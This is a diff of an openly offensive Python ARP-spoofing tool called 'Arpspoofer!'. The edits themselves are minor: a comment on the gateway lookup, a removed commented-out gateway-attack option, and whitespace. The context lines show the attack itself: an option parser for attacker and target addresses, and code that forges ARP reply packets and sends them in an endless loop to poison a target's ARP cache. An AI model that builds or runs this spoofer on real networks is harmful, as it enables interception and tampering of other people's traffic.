@@ -35,7 +35,7 @@ if __name__=='__main__':
 	#global
 	interface="eth0"
 	delay=0
-	getWay=os.popen("ip route|grep 'default'|awk '{print $3}'").read()
+	getWay=os.popen("ip route|grep 'default'|awk '{print $3}'").read() #this hose default gateway
 	
 	opt=OptionParser(add_help_option=False,epilog="Arpspoofer!")
 	opt.add_option("-h","--help",dest="help",action='store_true',help="help you")
@@ -43,7 +43,7 @@ if __name__=='__main__':
 	opt.add_option("-s","--sorce",dest="sorce",help="Attaker sorce ip add") 
 	opt.add_option("-t","--target",dest="target",help="ip of target. default= default gateway") 
 	opt.add_option("-d","--delay",dest="delay",help="delay betwin Arp-packets sending")
-        #opt.add_option("-gw","--getway",dest="gwYoN",help="shuld getway be attacked as well. Y for yes")
+     
 	op, args=opt.parse_args()
 	
 	if op.help:
@@ -62,8 +62,8 @@ if __name__=='__main__':
 
 	if op.delay is not None:
 		delay=op.delay
+		
       #bild & send packet
-        
 	packet=ARP(op=2,pdst=Target,psrc=Sorce)
 			
 	while True:
